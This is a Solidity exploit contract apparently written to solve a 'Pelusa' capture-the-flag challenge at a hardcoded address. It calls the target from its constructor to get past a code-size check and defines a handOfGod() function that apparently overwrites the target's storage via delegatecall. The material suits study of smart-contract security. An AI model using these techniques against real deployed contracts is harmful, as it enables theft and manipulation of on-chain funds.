   // SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IPelusa {
    function passTheBall() external;
    function shoot() external;
    function owner() external returns (address);
}

contract PelusaAttack {

    address internal player;

    uint256 public goals = 1;

    IPelusa private pelusa = IPelusa(0xb35D22d01Cd8b1D2c6450B252428bFef81487358);

    constructor() {
        pelusa.passTheBall();
    }

    function getBallPossesion() external returns (address) {
        return pelusa.owner();
    }

    function callShoot() external {
        pelusa.shoot();
    }

    function handOfGod() external returns (bytes32) {
        goals = 2;
        return bytes32(uint256(22061986));
    }

    
}